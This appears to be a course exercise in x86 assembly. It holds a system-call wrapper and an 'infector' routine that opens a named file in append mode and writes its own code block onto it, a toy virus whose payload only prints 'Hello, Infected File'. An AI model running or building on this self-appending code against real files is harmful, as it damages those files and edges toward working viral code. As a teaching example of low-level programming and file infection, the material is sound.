WRITE EQU 4
STDOUT EQU 1
OPEN EQU 5
CLOSE EQU 6
O_APPEND EQU 1024
O_WRONLY EQU 1

section .rodata
section .data
section .text
    global _start
    global system_call
    global infection
    global infector
    extern main
    extern printVirus
    extern printError
_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

code_start:
    str: db " Hello, Infected File",10, 0
    dummyStr:
infection:
    pushad
    mov eax,WRITE
    mov ebx,STDOUT
    mov ecx,str
    mov edx,dummyStr-str-1 
    int 0x80
    popad
    ret
infector:
    push ebp
    mov ebp, esp
    pushad
    
    ; Call infection to print "Hello, Infected File"
    call infection
    
    ; open file
    mov ebx, [ebp+8]   ; get first argument filename
    mov eax, OPEN
    mov ecx, O_APPEND | O_WRONLY
    int 0x80
    cmp eax, 0
    jl errorOpen
    push eax
    ; write to file
    mov ebx, eax       ; file descriptor
    mov eax, WRITE
    mov ecx, code_start
    mov edx, code_end-code_start
    int 0x80
    ; close file
    mov eax, CLOSE 
    int 0x80
    pop eax
    jmp finish
errorOpen:
    call printError
finish:
    popad
    pop ebp
    ret
code_end:
